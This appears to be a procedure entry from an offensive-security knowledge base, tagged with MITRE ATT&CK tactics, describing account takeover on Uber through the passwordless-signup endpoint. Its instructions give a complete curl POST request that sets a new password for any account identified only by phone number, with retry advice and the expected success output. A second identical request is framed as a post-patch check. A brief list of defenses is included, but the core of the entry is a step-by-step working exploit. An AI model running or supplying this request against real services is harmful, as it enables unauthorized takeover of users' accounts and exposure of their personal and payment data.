---
id: 49bf556c-1175-4644-9255-e90bb2aeff7f
name: Replay-Uber-Passwordless-Signup-for-Password-Reset
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:34.410Z'
tactics:
  - '[[Initial Access]]'
  - '[[Lateral Movement]]'
techniques:
  - '[[Valid Accounts]]'
  - '[[Modify Authentication Process]]'
tags:
  - api-abuse
  - password-reset
  - uber
platforms:
  - Web
commands:
  - '[[commands/uber-passwordless-signup-reset]]'
  - '[[commands/uber-passwordless-signup-postfix-test]]'
tools: []
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Modify Authentication Process]]'
---

# Replay-Uber-Passwordless-Signup-for-Password-Reset

## Summary

This procedure exploits the /rt/users/passwordless-signup endpoint by replaying a crafted POST request to set a new password for any Uber account identified by phone number, bypassing ownership verification and achieving unauthorized password modification.

## Description

The vulnerability stems from the endpoint treating arbitrary phone numbers as part of a passwordless signup flow without checking user ownership or workflow state integrity. Attackers can enumerate registered users via phone numbers and directly invoke the CREATE_NEW_PASSWORD state. This leads to account takeover, exposing personal data, trip history, and payment details. Post-exploitation, validate fixes by testing rejection responses.

## Requirements

1. Target's phone number in E.164 format
2. HTTP client (e.g., curl) for POST requests
3. Knowledge of Uber's API headers (e.g., iPhone User-Agent)
4. Optional: Proxy tool to inspect app traffic

## Defense

Defensive measures and detection strategies:

- Enforce workflow state validation and session tokens
- Implement phone number ownership checks (e.g., OTP verification)
- Rate limit requests to the endpoint by IP and phone number
- Log and monitor for anomalous state transitions

## Objectives

1. Reset password for target account without authentication
2. Confirm successful state change to SUCCEEDED
3. Validate remediation by inducing failure responses

## Instructions

### Step 1: Craft and Send Exploit Request

**Context**: Prepare the JSON payload with target's phone and new password, then execute the request to trigger the vulnerable flow.

**Command** ([[commands/uber-passwordless-signup-reset]]):
```bash
curl -X POST https://cn-geo1.uber.com/rt/users/passwordless-signup \
  -H "User-Agent: client/iphone/2.137.1" \
  -H "Content-Type: application/json" \
  -H "Connection: close" \
  -d '{"phoneNumberE164":"+xxxxxxxx","userWorkflow":"PASSWORDLESS_SIGNUP","userRole":"client","mobileCountryISO2":"XX","state":"CREATE_NEW_PASSWORD","newPasswordData":{"newPassword":"12345678911a!"}}'
```

> This command sends the request; if it fails on first try due to state mismatch, retry immediately. Expected output includes "serverState":"SUCCEEDED" confirming password set.

### Step 2: Validate Post-Fix Behavior

**Context**: After patch deployment, test the same request to ensure it now rejects unauthorized attempts.

**Command** ([[commands/uber-passwordless-signup-postfix-test]]):
```bash
curl -X POST https://cn-geo1.uber.com/rt/users/passwordless-signup \
  -H "User-Agent: client/iphone/2.137.1" \
  -H "Content-Type: application/json" \
  -H "Connection: close" \
  -d '{"phoneNumberE164":"+xxxxx","userWorkflow":"PASSWORDLESS_SIGNUP","userRole":"client","mobileCountryISO2":"XX","state":"CREATE_NEW_PASSWORD","newPasswordData":{"newPassword":"12345678911a!"}}'
```

> Expected: "serverState":"FAILED" with error "Jumping state, client side bug (or an attack)!" indicating remediation.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Modify Authentication Process]] Modify Authentication Process

### Sub-Techniques


## Commands Used

- [[commands/uber-passwordless-signup-reset]]
- [[commands/uber-passwordless-signup-postfix-test]]

## Tools Used


## Tags

- [[api-abuse]]
- [[password-reset]]
- [[uber]]
